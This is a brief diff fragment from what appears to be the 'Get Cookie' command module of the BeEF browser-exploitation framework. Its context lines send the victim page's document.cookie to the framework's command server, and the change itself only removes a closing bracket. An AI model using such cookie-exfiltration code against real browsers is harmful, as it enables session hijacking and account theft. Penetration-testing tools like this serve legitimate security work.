@@ -11,5 +11,5 @@ try {
       beef.net.send("<%= @command_url %>", <%= @command_id %>, 'cookie='+document.cookie, beef.are.status_error());
       beef.debug("[Get Cookie] Error");
 }
-});
+
 
